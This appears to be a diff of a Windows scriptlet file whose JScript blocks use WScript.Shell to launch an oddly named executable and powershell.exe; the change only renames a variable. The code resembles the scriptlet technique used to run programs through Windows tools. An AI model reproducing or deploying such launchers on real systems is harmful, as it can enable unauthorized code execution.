@@ -14,7 +14,7 @@
 	<script language="JScript">	
 		<![CDATA[	
 
-			var r = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
+			var help = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
 
 		]]>	
 </script>	
@@ -28,7 +28,7 @@
 
 	function Exec()	
 	{	
-		var r = new ActiveXObject("WScript.Shell").Run("powershell.exe");	
+		var help = new ActiveXObject("WScript.Shell").Run("powershell.exe");	
 	}	
 
 ]]>	
